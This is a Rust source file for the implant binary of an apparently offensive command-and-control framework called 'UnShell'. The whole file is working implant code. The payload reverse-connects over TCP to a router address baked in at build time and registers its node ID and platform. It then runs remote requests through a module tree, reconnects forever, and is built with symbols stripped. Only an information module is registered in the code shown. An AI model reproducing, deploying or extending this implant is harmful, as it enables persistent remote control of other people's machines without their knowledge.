//! # ush-payload — UnShell Implant Binary
//!
//! The payload runs on the target machine. It:
//!
//! 1. Connects to the router over TCP (reverse connection: payload → router).
//! 2. Sends a `HandshakeMessage` to register its modules.
//! 3. Receives a `HandshakeAck`.
//! 4. Enters the recv loop: deserialise `TreeRequest` → dispatch to `Tree` → send `TreeResponse`.
//!
//! ## Building
//!
//! ```text
//! cargo build --profile minimize -p ush-payload
//! ```
//!
//! The `minimize` profile strips symbols and optimises for binary size.
//!
//! ## Module registration
//!
//! Modules are registered in the `Tree` before the connection loop starts.
//! Each module implements `Endpoint` and is registered at a path prefix.
//! The router will route requests to these paths to this payload.
//!
//! ## Reconnection
//!
//! If the connection to the router drops, the payload waits 5 seconds and
//! reconnects. This loop runs forever.

mod modules;

use std::thread;
use std::time::Duration;

use unshell::protocol::{HandshakeAck, HandshakeMessage, NodeType, PacketHeader, PacketType};
use unshell::transport::tcp::TcpTransport;
use unshell::transport::Transport;
use unshell::tree::Tree;

// ---------------------------------------------------------------------------
// Configuration
// Router address and node ID are baked at compile time via environment variables.
//
// Set before building:
//   ROUTER_HOST=1.2.3.4 ROUTER_PORT=9000 NODE_ID=abc123 cargo build -p ush-payload
//
// Defaults (for development) point to localhost.
// ---------------------------------------------------------------------------

/// The router's IP or hostname. Override with ROUTER_HOST env var at build time.
const ROUTER_HOST: &str = match option_env!("ROUTER_HOST") {
    Some(h) => h,
    None => "127.0.0.1",
};
/// The router's port. Override with ROUTER_PORT env var at build time.
const ROUTER_PORT: &str = match option_env!("ROUTER_PORT") {
    Some(p) => p,
    None => "9000",
};
/// This payload's node ID (base62, unique per implant).
/// Override with NODE_ID env var at build time.
const NODE_ID: &str = match option_env!("NODE_ID") {
    Some(id) => id,
    None => "devpayload",
};

fn main() {
    let router_addr = format!("{ROUTER_HOST}:{ROUTER_PORT}");

    // Build the module tree
    let mut tree = build_tree();

    // Connection loop — reconnects on any error
    loop {
        match connect_and_run(&router_addr, &mut tree) {
            Ok(()) => {
                // Clean disconnect — still reconnect
                eprintln!("[payload] disconnected, reconnecting in 5s...");
            }
            Err(e) => {
                eprintln!("[payload] error: {e}, reconnecting in 5s...");
            }
        }
        thread::sleep(Duration::from_secs(5));
    }
}

/// Register all modules in the tree.
///
/// Add new capabilities by registering additional `Endpoint` implementations here.
fn build_tree() -> Tree {
    let mut tree = Tree::new();
    tree.register("/info", modules::info::InfoModule);
    tree
}

/// Connect to the router, complete the handshake, and run the recv loop.
///
/// Returns when the connection is lost or an unrecoverable error occurs.
///
/// # Errors
///
/// Returns an error string describing what went wrong.
fn connect_and_run(
    router_addr: &str,
    tree: &mut Tree,
) -> Result<(), Box<dyn std::error::Error>> {
    eprintln!("[payload] connecting to {router_addr}...");
    let mut transport = TcpTransport::connect(router_addr)?;
    eprintln!("[payload] connected");

    // Build the list of registered paths for the handshake
    let base_path = format!("/agents/{NODE_ID}");
    let registered = tree.registered_paths(&base_path);

    // Send handshake
    let handshake = HandshakeMessage {
        node_id: NODE_ID.to_owned(),
        node_type: NodeType::Payload,
        registered_paths: registered,
        platform: std::env::consts::OS.to_owned(),
    };
    let handshake_payload = rkyv::to_bytes::<rkyv::rancor::Error>(&handshake)
        .map_err(|e| format!("failed to serialise handshake: {e}"))?;
    let handshake_header = PacketHeader {
        dst_path: "/router".to_owned(),
        src_path: base_path.clone(),
        packet_type: PacketType::Handshake,
    };
    transport.send(&handshake_header, &handshake_payload)?;
    eprintln!("[payload] handshake sent");

    // Receive ack
    let (ack_header, ack_payload) = transport.recv()?;
    if ack_header.packet_type != PacketType::HandshakeAck {
        return Err(format!(
            "expected HandshakeAck, got {:?}",
            ack_header.packet_type
        )
        .into());
    }
    let ack: HandshakeAck =
        rkyv::from_bytes::<HandshakeAck, rkyv::rancor::Error>(&ack_payload)
            .map_err(|e| format!("failed to deserialise HandshakeAck: {e}"))?;

    if !ack.accepted {
        return Err(format!(
            "router rejected registration: {}",
            ack.rejection_reason.unwrap_or_else(|| "no reason given".into())
        )
        .into());
    }

    eprintln!(
        "[payload] registered at {}",
        ack.assigned_base_path
    );

    // Main recv loop
    recv_loop(&mut transport, tree, &base_path)
}

/// Receive and dispatch `TreeRequest` packets until the connection drops.
///
/// For each request:
/// 1. Read the packet header and payload.
/// 2. Deserialise the payload as a `TreeRequest`.
/// 3. Strip the base path prefix from the destination path to get the local path.
/// 4. Dispatch to the `Tree`.
/// 5. Serialise the `TreeResponse` and send it back.
///
/// Returns when a transport error occurs (disconnection, etc.).
fn recv_loop(
    transport: &mut TcpTransport,
    tree: &mut Tree,
    base_path: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    loop {
        let (header, payload) = transport.recv()?;

        if header.packet_type != PacketType::Request {
            eprintln!("[payload] unexpected packet type: {:?}", header.packet_type);
            continue;
        }

        // Deserialise the request
        let request =
            match rkyv::from_bytes::<unshell::protocol::TreeRequest, rkyv::rancor::Error>(
                &payload,
            ) {
                Ok(r) => r,
                Err(e) => {
                    eprintln!("[payload] failed to deserialise request: {e}");
                    continue;
                }
            };

        // Strip the base path to get the local path
        let local_path = header
            .dst_path
            .strip_prefix(base_path)
            .unwrap_or(&header.dst_path);

        // Dispatch to the tree
        let response = tree.dispatch(request, local_path);

        // Send response
        let response_payload = match rkyv::to_bytes::<rkyv::rancor::Error>(&response) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[payload] failed to serialise response: {e}");
                continue;
            }
        };

        let response_header = PacketHeader {
            dst_path: header.src_path.clone(),
            src_path: header.dst_path.clone(),
            packet_type: PacketType::Response,
        };

        if let Err(e) = transport.send(&response_header, &response_payload) {
            return Err(e.into());
        }
    }
}

// ---------------------------------------------------------------------------
// Default module: /info
// ---------------------------------------------------------------------------

// Modules live in ush-payload/src/modules/
// Add new capabilities by creating new files in that directory.
